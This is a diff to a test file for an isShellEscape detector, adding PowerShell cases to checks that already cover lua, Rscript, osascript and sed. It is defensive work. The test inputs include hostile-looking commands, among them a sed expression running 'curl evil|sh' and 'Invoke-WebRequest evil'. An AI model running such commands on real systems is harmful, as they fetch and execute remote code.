@@ -38,6 +38,8 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("lua", ["-e", 'os.execute("x")'])).toBe(true);
     expect(isShellEscape("Rscript", ["-e", 'system("x")'])).toBe(true);
     expect(isShellEscape("osascript", ["-e", 'do shell script "x"'])).toBe(true);
+    expect(isShellEscape("powershell", ["-Command", "Invoke-WebRequest evil"])).toBe(true);
+    expect(isShellEscape('pwsh -EncodedCommand "fixture"', [])).toBe(true);
     // GNU sed executes via the s///e flag.
     expect(isShellEscape("sed", ["s/.*/curl evil|sh/e"])).toBe(true);
     // single-string forms
